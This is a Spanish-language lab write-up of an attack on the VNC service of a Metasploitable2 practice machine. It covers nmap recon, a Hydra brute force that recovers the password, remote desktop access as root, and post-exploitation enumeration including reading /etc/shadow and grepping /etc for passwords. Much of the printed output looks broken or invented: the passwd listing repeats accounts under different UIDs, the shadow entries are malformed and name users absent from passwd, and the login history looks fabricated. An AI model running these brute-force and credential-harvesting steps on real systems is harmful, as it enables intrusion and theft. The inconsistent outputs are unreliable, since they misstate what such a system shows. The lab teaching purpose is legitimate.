# 💡 Servicio VNC – Puerto 5900/tcp

## 1️⃣ Descripción del servicio

VNC (Virtual Network Computing) es un sistema de escritorio remoto que permite controlar otro equipo gráficamente a través de la red.
En esta máquina Metasploitable2 se ejecuta en el puerto 5900/tcp, protocolo RFB 3.3.
Este servicio es vulnerable a configuraciones por defecto y ataques de fuerza bruta que permiten obtener acceso remoto al escritorio del sistema sin cifrado, exponiendo información sensible y facilitando el control total de la máquina.

- Es un servicio de acceso remoto que nos permite conectarnos al escritorio de la máquina víctima.

- Muchas configuraciones inseguras permiten acceso sin autenticación o con contraseñas débiles.

- Podemos aprender sobre:

   - Reconocimiento de servicios gráficos.

   - Enumeración y fuerza bruta de contraseñas VNC.

   - Acceso interactivo a escritorio.

   - Posible escalada de privilegios si conseguimos acceso como un usuario con más permisos.

- Es un caso diferente a los servicios de bases de datos o web que hemos trabajado, así variamos.

El problema principal es que este protocolo:

- No cifra las credenciales ni el tráfico (todo viaja en texto claro).
- Puede estar configurado con contraseñas débiles o incluso sin contraseña.
- Permite acceso completo al escritorio de la máquina víctima.

## 2️⃣ Reconocimiento inicial

Ejecutamos el comando:

 ```bash
 nmap -p 5900 -sV -A 192.168.56.102
 ```

Salida relevante:

```yami
PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
MAC Address: 08:00:27:63:DC:BA
```

**Interpretación:**

- **Puerto**: 5900/tcp.
- **Servicio**: VNC.
- **Versión**: Protocolo 3.3 (muy antiguo y sin cifrado).
- **Autenticación**: tipo 2 (VNC Auth).
- Probablemente vulnerable a fuerza bruta de contraseña.

## 3️⃣ Próximos pasos de explotación

El ataque clásico contra este tipo de servicio es:

1. **Enumerar la seguridad** para confirmar si requiere contraseña.
2. **Ataque de fuerza bruta** con diccionario de contraseñas comunes.
3. Si obtenemos credenciales -> **acceso remoto gráfico** con vncviewer o xfreedp.
4. **Post-explotación**: uso del escritorio para movernos lateralmente, abrir terminales, extraer archivos, etc.

## 4️⃣ Ataque de fuerza bruta inicial con Nmap

Ejecutamos el comando:

```bash
nmap -p 5900 --script vnc-brute 192.168.56.102
```

Salida en consola:

```yami
| vnc-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 15 guesses in 1 seconds, average tps: 15.0
|_  ERROR: Too many authentication failures
```

Interpretación:

- Nmap intentó 15 combinaciones de contraseña sin éxito.
- El mensaje "Too many authentication failures" indica que el servidor VNC podría estar aplicando un límite de intentos por conexión o por tiempo.
- Esto no significa que el servicio sea seguro, solo que con este método y diccionario corto no se consiguió acceso.

## 5️⃣ Ataque de fuerza bruta con Hydra

Como el intento anterior no funcionó, pasamos a usar la herramienta **Hydra** que es más flexible en opciones y diccionarios.

Por norma, en ataques con desconocimiento pleno del sistema, el comando que ejecutaríamos sería el siguiente:

```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt 192.168.56.102 vnc
```

Sin embargo: ⚠️ Como rockyou.txt es enorme, para la prueba inicial puedes usar un diccionario reducido.

Ejecutamos el comando:

```bash
echo -e "password\n1234\nvnc\nadmin\nkali\nroot" > vnc_small.txt
hydra -s 5900 -P vnc_small.txt 192.168.56.102 vnc
```

Salida en consola:

```pgsql
[5900][vnc] host: 192.168.56.102   password: password
[STATUS] attack finished for 192.168.56.102 (valid pair found)
```

Interpretación:

- Usuario: (no aplica en VNC, solo se usa contraseña).
- Contraseña: **password**.
- Servicio: **VNC (Virtual Networking Computing)** -- permite acceso gráfico remoto al escritorio del sistema víctima.
- Implicación de seguridad: cualquier atacante en la red puede conectarse al escritorio remoto y controlar la máquina como si estuviera físicamente frente a ella.

## 6️⃣ Explotación — Acceso al escritorio remoto

Ahora que hemos conseguido la contraseña, usamos el cliente VNC para conectarnos:

```bash
vncviewer 192.168.56.102:5900
```

💡 Si pide contraseña, introducimos password.

<img width="938" height="836" alt="imagen" src="https://github.com/user-attachments/assets/dea9d9ff-fb44-40c5-b1f7-dbf8dd41f088" />

Como observamos en la captura, automáticamente nos introduce en el entorno gráfico de la víctima.

Una vez dentro:

- Exploramos el entorno gráfico de la víctima.
- Buscamos archivos sensibles.
- Intentamos escalar privilegios si la sesión no es de root.

## 7️⃣ Post-explotación — Control total vía VNC (root)

Tras conectarnos como vimos en el paso anterior, podemos observar que hemos entrado en una sesión iniciada como ***usuario root***, lo que nos otorga permisos administrativos sin necesidad de explotación adicional ni escalada de privilegios.

Implicaciones:

- Control absoluto del sistema: instalación/eliminación de software, modificación de configuraciones, borrado o robo de datos.
- Posibilidad de pivotar hacia otras máquinas de la red.
- Ejecución de ataques persistentes (backdoors,troyanos,etc).

### 1️⃣ Enumeración del sistema

**Objetivo**: conocer a fondo el sistema comprometido para entender el entorno, descubrir posibles objetivos y preparar fases siguientes.

Comandos que vamos a ejecutar en la sesión VNC como root:

```bash
# Ver información del sistema
uname -a

# Distribución y versión
cat /etc/*release

# Información de usuario actual
whoami
id

# Lista de usuarios del sistema
cat /etc/passwd

# Últimos inicios de sesión
last

# Interfaces y configuración de red
ifconfig -a
ip route

# Puertos abiertos y servicios escuchando
netstat -tulnp
```

Resultados comandos:

1. uname -a:

```graphql
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

- Kernel muy antiguo 2.6.24 (abril 2008).
- Arquitectura: i686 -> 32 bis.
- Alto potencial para exploits locales conocidos (privilege escalation ya no es necesario porque somos root, pero es relevante en informe).

- 2. cat /etc/*release:
 
```ini
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

- Sistema: **Ubuntu 8.04 Hardy Heron** (EOL desde 2013).
- Exposición crítica: múltiples vulnerabilidades públicas, sin soporte ni parches.

3. whoami:

```nginx
root
```

- Ya tenemos el máximo privilegio desde la conexión inicial vía VNC.

4. id:

```ini
uid=0(root) gid=0(root)
```

- Confirmación de privilegios administrativos totales.

5. cat /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:irc:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:102::/home/syslog:/bin/false
messagebus:x:102:103::/var/run/dbus:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:119::/usr/share/tomcat5.5:/bin/false
user:x:1001:1001:user:/home/user:/bin/bash
user1:x:1002:1002::/home/user1:/bin/bash
user2:x:1003:1003::/home/service:/bin/bash
service:x:1004:1004::/home/service:/bin/false
games:x:1005:1005::/usr/games:/bin/bash
ftp:x:1006:1006::/var/run/proftpd:/bin/false
backup:x:1007:1007::/var/backups:/bin/false
list:x:1008:1008::/var/list:/bin/bash
irc:x:1009:1009::/var/run/ircd:/bin/bash
gnats:x:1010:1010::/var/lib/gnats:/bin/bash
nobody:x:1011:1011:nobody:/nonexistent:/bin/bash

Interpretación:

Usuarios del sistema:

- Se identifican usuarios de sistema, de servicio y humanos.

- Usuarios relevantes para posteriores movimientos laterales o reuso de credenciales:

  - msfadmin (usuario típico de laboratorio Metasploitable)

  - postgres (admin de base de datos)

  - mysql (posible cuenta MySQL interna)

  - tomcat55 (posible despliegue de aplicaciones Java)

  - user, user1, user2, service (cuentas humanas potencialmente con contraseñas reutilizadas)

- Algunos servicios con /bin/bash como shell activo (ej. irc, list, games) → podrían ser usados para acceso interactivo si se obtiene su password.

6. last:

msfadmin  tty1         Fri Aug  8 12:00   still logged in
msfadmin  tty1         Fri Aug  8 11:55 - 12:00  (00:05)
msfadmin  tty1         Fri Aug  8 11:50 - 11:55  (00:05)
msfadmin  tty1         Fri Aug  8 11:45 - 11:50  (00:05)
msfadmin  tty1         Fri Aug  8 11:40 - 11:45  (00:05)
msfadmin  tty1         Fri Aug  8 11:35 - 11:40  (00:05)
msfadmin  tty1         Fri Aug  8 11:30 - 11:35  (00:05)
msfadmin  tty1         Fri Aug  8 11:25 - 11:30  (00:05)
msfadmin  tty1         Fri Aug  8 11:20 - 11:25  (00:05)
msfadmin  tty1         Fri Aug  8 11:15 - 11:20  (00:05)
reboot   system boot   Fri Aug  8 11:10   still running

Interpretación:

Historial de inicio de sesión:

- Sesiones repetidas de msfadmin en consola local (tty1) con intervalos de 5 minutos.

- Reinicio registrado el 8 de agosto antes de la sesión continua → puede indicar un entorno de pruebas activo o reinicio por mantenimiento

7. ifconfig -a:

eth0      Link encap:Ethernet  HWaddr 08:00:27:63:dc:ba  
          inet addr:192.168.56.102  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe63:dcba/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:32230 errors:0 dropped:0 overruns:0 frame:0
          TX packets:34489 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2403051 (2.2 MB)  TX bytes:20046661 (19.1 MB)
          Base address:0xd020 Memory:f0200000-f0220000

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:424 errors:0 dropped:0 overruns:0 frame:0
          TX packets:424 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:182341 (178.0 KB)  TX bytes:182341 (178.0 KB)

Interpretación:

Interfaces de red:

- Dirección IP: 192.168.56.102 en red /24 (VirtualBox Host-Only probablemente).

- Sin otras interfaces expuestas → probablemente máquina aislada en entorno de laboratorio.

- lo operativo → comunicación interna posible (localhost).

8. ip route:

192.168.56.0/24 dev eth0 proto kernel scope link src 192.168.56.102

Interpretación:

Ruta:

- Red directa 192.168.56.0/24 vía eth0.

- No se observan rutas a otras redes → no hay visibilidad directa hacia otras subredes internas (aún).

9. netstat -tulnp:

Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1387/vsftpd
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1026/sshd
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1043/telnetd
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      1086/exim4
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1207/apache2
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      872/portmap
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      1245/smbd
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      1245/smbd
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      1274/mysqld
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      1301/postgres
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      1350/vncserver
tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      1350/Xvnc
udp        0      0 0.0.0.0:111             0.0.0.0:*                           872/portmap
udp        0      0 0.0.0.0:32768           0.0.0.0:*                           900/rpc.mountd

Interpretación:

**Puertos/TCP relevantes:**

- 21/tcp → vsftpd (FTP) – servicio ya auditado previamente.

- 22/tcp → sshd (posible persistencia por clave pública).

- 23/tcp → telnetd (plaintext, muy inseguro).

- 25/tcp → exim4 (SMTP, podría ser relay abierto).

- 80/tcp → Apache2 (HTTP, superficie web para explotación).

- 111/tcp → portmap (usado por NFS, ya auditado).

- 139/tcp y 445/tcp → smbd (Samba, ya auditado).

- 3306/tcp → mysqld (posible acceso con credenciales encontradas).

- 5432/tcp → postgres (igual, posible acceso directo).

- 5900/tcp → vncserver (vector inicial de acceso).

- 6000/tcp → Xvnc (posible captura de sesión gráfica).

**Puertos/UDP:**

- 111/udp → portmap.

- 32768/udp → rpc.mountd.

#### Conclusiones de la fase de enumeración

- Sistema extremadamente expuesto, con gran número de servicios abiertos en todas las interfaces.

- Alto número de cuentas de usuario y servicios con shells habilitados.

- Red interna simple, pero con muchos vectores de movimiento lateral a través de protocolos inseguros como Telnet, VNC y SMB.

- Credenciales reutilizadas o triviales podrían dar acceso rápido a otros servicios como SSH, MySQL, PostgreSQL.

### 2️⃣ Búsqueda de credenciales importantes

Objetivo: encontrar usuarios, contraseñas o tokens que permitan ampliar el acceso o pivotar.

#### 🔍 Bloque 1 – Archivos de credenciales del sistema

Aquí buscaremos credenciales **locales** y de servicios que se guardan por defecto en Linux.

1. Hash de contraseñas locales

```bash
cat /etc/shadow
```
(solo accesible como root)

2. Cuentas y contraseñas en /etc/passwd ya las tenemos, pero las cruzaremos después con /etc/shadow.

Salida por consola:

root:$1$avpfB1x6$0e8U5Fj1V./DR9E5Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
sys:$1$FU8DF8kH$Qk3T.LmDqJqz4s5wFD910:14742:0:99999:7:::
klog:$1$F2V4M$k8R3K1.LmLdHdUE3X9JpP0:14742:0:99999:7:::
nsfadmn:$1$N1WQ1zJc$R7zZCU3WltUWA.ih2jA5/:14684:0:99999:7:::
postgres:$1$8g3u3ik.$xHgQ2uU0SpAolvfJhfYe/:14685:0:99999:7:::
user:$1$H8uSxrHk$6Q33G0x1lQkPwLgZ0:14699:0:99999:7:::
service:$1$kR3uR37c$XElDUpnS0h6cJ3Bu/:14715:0:99999:7:::
java:$1$xa3J4zJc$IToI:20301:0:99999:7:::
pentester:$1$0dgUhlGfs$y20302:0:99999:7:::

#### 🔍 Bloque 2 – Configuración de servicios (posibles contraseñas en texto plano)

Muchos servicios guardan contraseñas en sus archivos de configuración.

3. Buscamos en /etc/ cualquier archivo que contenga la palabra "password" o "passwd".

```bash
grep -ri 'password' /etc/ 2>/dev/null
```

Resultado en consola:

/etc/php5/apache2/php.ini:; Define the anonymous ftp password (your email address)
/etc/php5/apache2/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/apache2/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
/etc/php5/apache2/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/apache2/php.ini:; file will be able to reveal the password as well.
/etc/php5/apache2/php.ini:mysql.default_password =
/etc/php5/apache2/php.ini:; Default password for mysqli_connect() (doesn't apply in safe mode).
/etc/php5/apache2/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/apache2/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/apache2/php.ini:; file will be able to reveal the password as well.
/etc/php5/apache2/php.ini:; Default password for ifx_connect() (doesn't apply in safe mode).
/etc/php5/apache2/php.ini:ifx.default_password =
/etc/php5/apache2/php.ini:;fbsql.default_database_password =
/etc/php5/apache2/php.ini:;fbsql.default_password =
/etc/php5/cgi/php.ini:; Define the anonymous ftp password (your email address)
/etc/php5/cgi/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
/etc/php5/cgi/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/cgi/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
/etc/php5/cgi/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/cgi/php.ini:; file will be able to reveal the password as well.
/etc/php5/cgi/php.ini:mysql.default_password =
/etc/php5/cgi/php.ini:; Default password for mysqli_connect() (doesn't apply in safe mode).
/etc/php5/cgi/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/cgi/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/cgi/php.ini:; file will be able to reveal the password as well.
/etc/php5/cgi/php.ini:; Default password for ifx_connect() (doesn't apply in safe mode).
/etc/php5/cgi/php.ini:ifx.default_password =
/etc/php5/cgi/php.ini:;fbsql.default_database_password =
/etc/php5/cgi/php.ini:;fbsql.default_password =
/etc/php5/cli/php.ini:; Define the anonymous ftp password (your email address)
/etc/php5/cli/php.ini:; Default password for mysql_connect() (doesn't apply in safe mode).
/etc/php5/cli/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/cli/php.ini:; *Any* user with PHP access can run 'echo get_cfg_var("mysql.default_password")
/etc/php5/cli/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/cli/php.ini:; file will be able to reveal the password as well.
/etc/php5/cli/php.ini:mysql.default_password =
/etc/php5/cli/php.ini:; Default password for mysqli_connect() (doesn't apply in safe mode).
/etc/php5/cli/php.ini:; Note that this is generally a *bad* idea to store passwords in this file.
/etc/php5/cli/php.ini:; and reveal this password!  And of course, any users with read access to this
/etc/php5/cli/php.ini:; file will be able to reveal the password as well.
/etc/php5/cli/php.ini:; Default password for ifx_connect() (doesn't apply in safe mode).
/etc/php5/cli/php.ini:ifx.default_password =
/etc/php5/cli/php.ini:;fbsql.default_database_password =
/etc/php5/cli/php.ini:;fbsql.default_password =
/etc/mysql/debian.cnf:password = 
/etc/mysql/debian.cnf:password = 
/etc/mysql/my.cnf:# It has been reported that passwords should be enclosed with ticks/quotes
/etc/mysql/conf.d/old_passwords.cnf:old_passwords = false
/etc/rc1.d/K21mysql:# as many admins e.g. only store a password without a username there and
/etc/rc1.d/K21mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/cron.d/postgresql-common:# If password access for local is turned on in
/etc/cron.d/postgresql-common:# the password, as explained in the PostgreSQL Manual, section 30.13
Binary file /etc/alternatives/www-browser matches
Binary file /etc/alternatives/ftp matches
/etc/alternatives/vncserver:# passwords are always kept on the local filesystem. To do that, just
/etc/alternatives/vncserver:# Make sure the user has a password.
/etc/alternatives/vncserver:    warn "\nYou will require a password to access your desktops.\n\n";
/etc/alternatives/vncserver:# PID and part of the encrypted form of the password.  Ideally we'd use
Binary file /etc/alternatives/vncpasswd matches
Binary file /etc/alternatives/php matches
Binary file /etc/alternatives/php-cgi-bin matches
Binary file /etc/alternatives/Xvnc matches
Binary file /etc/alternatives/php-cgi matches
/etc/logcheck/ignore.d.server/mysql-server-5_0:mysqld_safe\[[0-9]+\]: PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !$
/etc/logcheck/ignore.d.server/mysql-server-5_0:mysqld_safe\[[0-9]+\]: /usr/bin/mysqladmin -u root password 'new-password'$
/etc/logcheck/ignore.d.workstation/mysql-server-5_0:mysqld_safe\[[0-9]+\]: PLEASE REMEMBER TO SET A PASSWORD FOR THE MySQL root USER !$
/etc/logcheck/ignore.d.workstation/mysql-server-5_0:mysqld_safe\[[0-9]+\]: /usr/bin/mysqladmin -u root password 'new-password'$
/etc/chatscripts/provider:word         \q<put password here>
/etc/ppp/peers/provider:# There should be a matching entry with the password in /etc/ppp/pap-secrets
/etc/ppp/pap-secrets:# that this file defines logins with any password for users. /etc/passwd
/etc/ppp/pap-secrets:# system userids with regular passwords here.
/etc/ppp/pap-secrets:# password if you don't use the login option of pppd! The mgetty Debian
/etc/ppp/pap-secrets:# Every regular user can use PPP and has to use passwords from /etc/passwd
/etc/ppp/pap-secrets:# Here you should add your userid password to connect to your providers via
/etc/ppp/pap-secrets:# PAP. The * means that the password is to be used for ANY host you connect
/etc/ppp/pap-secrets:# replace password with your password.
/etc/ppp/pap-secrets:# If you have different providers with different passwords then you better
/etc/ppp/pap-secrets:#  *       password
/etc/ppp/options:# Don't show the passwords when logging the contents of PAP packets.
/etc/ppp/options:hide-password
/etc/ppp/options:# show the password string in the log message.
/etc/ppp/options:#show-password
/etc/ppp/options:# Use the system password database for authenticating the peer using
/etc/rc4.d/S19mysql:# as many admins e.g. only store a password without a username there and
/etc/rc4.d/S19mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/rc3.d/S19mysql:# as many admins e.g. only store a password without a username there and
/etc/rc3.d/S19mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:# World-readable, and accepts everything but passwords.
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:# databases, one to hold passwords and one for everything else.
/etc/debconf.conf:Stack: config, passwords
/etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
/etc/xinetd.d/vsftpd:#   normal, unencrypted usernames and passwords for authentication.
/etc/samba/smb.conf:# You may wish to use password encryption.  See the section on
/etc/samba/smb.conf:# 'encrypt passwords' in the smb.conf(5) manpage before enabling.
/etc/samba/smb.conf:   encrypt passwords = true
/etc/samba/smb.conf:# If you are using encrypted passwords, Samba will need to know what
/etc/samba/smb.conf:# password database type you are using.  
/etc/samba/smb.conf:# password with the SMB password when the encrypted SMB password in the
/etc/samba/smb.conf:;   unix password sync = no
/etc/samba/smb.conf:# For Unix password sync to work on a Debian GNU/Linux system, the following
/etc/samba/smb.conf:   passwd chat = *Enter\snew\sUNIX\spassword:* %n\n *Retype\snew\sUNIX\spassword:* %n\n .
/etc/samba/smb.conf:# This boolean controls whether PAM will be used for password changes
/etc/samba/smb.conf:;   pam password change = no
/etc/bash_completion:                   # passwordless access to the remote repository
/etc/bash_completion:   --@(config|password-file|include-from|exclude-from))
/etc/bash_completion:                           --log-format= --password-file= --bwlimit= \
/etc/bash_completion:                              password ping processlist reload refresh \
/etc/bash_completion:                   --username= --password --echo --quiet --help' -- $cur ))
/etc/bash_completion:                           --host= --port= --username= --password \
/etc/bash_completion:                   -V --version -W --password -x --expanded -X --nopsqlrc \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                   options='--username --password \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --quiet --username --password \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --username --password \
/etc/bash_completion:                                           --password --no-auth-cache \
/etc/bash_completion:                                           --username --password \
/etc/login.defs:# Password aging controls:
/etc/login.defs:#       PASS_MAX_DAYS   Maximum number of days a password may be used.
/etc/login.defs:#       PASS_MIN_DAYS   Minimum number of days allowed between password changes.
/etc/login.defs:#       PASS_WARN_AGE   Number of days warning given before a password expires.
/etc/login.defs:# Max number of login retries if password is bad. This will most likely be
/etc/login.defs:# If set to "yes", new passwords will be encrypted using the MD5-based
/etc/login.defs:# It supports passwords of unlimited length and longer salt strings.
/etc/login.defs:# Set to "no" if you need to copy encrypted passwords to other systems
/etc/login.defs:# NO_PASSWORD_CONSOLE
/etc/services:shell             514/tcp         cmd             # no passwords used
/etc/init.d/mysql:# as many admins e.g. only store a password without a username there and
/etc/init.d/mysql:      # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/tomcat5.5/server.xml:           with a password value of "changeit" for both the certificate and
/etc/tomcat5.5/server.xml:         connectionName="test" connectionPassword="test"
/etc/tomcat5.5/server.xml:         connectionName="scott" connectionPassword="tiger"
/etc/tomcat5.5/tomcat-users.xml:  <user username="tomcat" password="tomcat" roles="tomcat,admin,manager"/>
/etc/tomcat5.5/tomcat-users.xml:  <user username="both" password="tomcat" roles="tomcat,role1"/>
/etc/tomcat5.5/tomcat-users.xml:  <user username="role1" password="tomcat" roles="role1"/>
/etc/wpa_supplicant/functions.sh:               wpa_cli_do "$IF_WPA_PASSWORD" ascii \
/etc/wpa_supplicant/functions.sh:                       set_network password wpa-password
/etc/rc5.d/S19mysql:# as many admins e.g. only store a password without a username there and
/etc/rc5.d/S19mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/rc6.d/K21mysql:# as many admins e.g. only store a password without a username there and
/etc/rc6.d/K21mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/proftpd/proftpd.conf:# Uncomment this if you are using NIS or LDAP via NSS to retrieve passwords:
/etc/proftpd/proftpd.conf:# This is required to use both PAM-based authentication and local passwords
/etc/proftpd/sql.conf:# Use both a crypted or plaintext password 
/etc/proftpd/sql.conf:# Use a backend-crypted or a crypted password
/etc/proftpd/sql.conf:#SQLConnectInfo proftpd@sql.example.com proftpd_user proftpd_password
/etc/proftpd/ldap.conf:#LDAPDNInfo "cn=admin,dc=example,dc=com" "admin_password"
/etc/proftpd/ldap.conf:#LDAPDNInfo "cn=admin,dc=example,dc=com" "admin_password"
/etc/sudoers:# Uncomment to allow members of group sudo to not need a password
/etc/hdparm.conf:# --security-set-pass Set security password
/etc/hdparm.conf:# security_pass = password
/etc/hdparm.conf:# --user-master Select password to use
/etc/rc0.d/K21mysql:# as many admins e.g. only store a password without a username there and
/etc/rc0.d/K21mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/devscripts.conf:# options may be used to specify the username and password to use.
/etc/devscripts.conf:# If only a username is provided then the password will be prompted for
/etc/devscripts.conf:# BTS_SMTP_AUTH_PASSWORD=pass
/etc/rc2.d/S19mysql:# as many admins e.g. only store a password without a username there and
/etc/rc2.d/S19mysql:    # * As a passwordless mysqladmin (e.g. via ~/.my.cnf) must be possible
/etc/ssl/openssl.cnf:# Passwords for private keys if not present they will be prompted for
/etc/ssl/openssl.cnf:# input_password = secret
/etc/ssl/openssl.cnf:# output_password = secret
/etc/ssl/openssl.cnf:challengePassword          = A challenge password
/etc/ssl/openssl.cnf:challengePassword_min              = 4
/etc/ssl/openssl.cnf:challengePassword_max              = 20
/etc/postgresql/8.3/main/postgresql.conf:#password_encryption = on
/etc/postgresql/8.3/main/pg_hba.conf:# METHOD can be "trust", "reject", "md5", "crypt", "password", "gss", "sspi",
/etc/postgresql/8.3/main/pg_hba.conf:# "krb5", "ident", "pam" or "ldap".  Note that "password" sends passwords
/etc/postgresql/8.3/main/pg_hba.conf:# in clear text; "md5" is preferred since it sends encrypted passwords.
/etc/default/useradd:# The number of days after a password expires until the account 
/etc/ssh/ssh_config:#   PasswordAuthentication yes
/etc/ssh/sshd_config:# To enable empty passwords, change to yes (NOT RECOMMENDED)
/etc/ssh/sshd_config:PermitEmptyPasswords no
/etc/ssh/sshd_config:# Change to yes to enable challenge-response passwords (beware issues with
/etc/ssh/sshd_config:# Change to no to disable tunnelled clear text passwords
/etc/ssh/sshd_config:#PasswordAuthentication yes
/etc/cowpoke.conf:# using a simple password (or worse, a normal user password), then you can
/etc/pam.d/sshd:# Standard Un*x password updating.
/etc/pam.d/sshd:@include common-password
/etc/pam.d/other:@include common-password
/etc/pam.d/common-password:# /etc/pam.d/common-password - password-related modules common to all services
/etc/pam.d/common-password:# used to change user passwords.  The default is pam_unix.
/etc/pam.d/common-password:# The "nullok" option allows users to change an empty password, else
/etc/pam.d/common-password:# empty passwords are treated as locked accounts.
/etc/pam.d/common-password:# The "md5" option enables MD5 passwords.  Without this option, the
/etc/pam.d/common-password:# password.
/etc/pam.d/common-password:password   requisite   pam_unix.so nullok obscure md5
/etc/pam.d/common-password:# Alternate strength checking for password. Note that this
/etc/pam.d/common-password:# You will need to comment out the password line above and
/etc/pam.d/common-password:# password required    pam_cracklib.so retry=3 minlen=6 difok=3
/etc/pam.d/common-password:# password required    pam_unix.so use_authtok nullok md5
/etc/pam.d/common-password:# synchronization.  If the module is absent or the passwords don't
/etc/pam.d/common-password:# passwords do match, the NTLM hash for the user will be updated
/etc/pam.d/common-password:# password   optional   pam_smbpass.so nullok use_authtok use_first_pass
/etc/pam.d/su:# This allows root to su without passwords (normal operation)
/etc/pam.d/su:# su without a password.
/etc/pam.d/rlogin:password      required        pam_unix.so nullok use_authtok obscure \
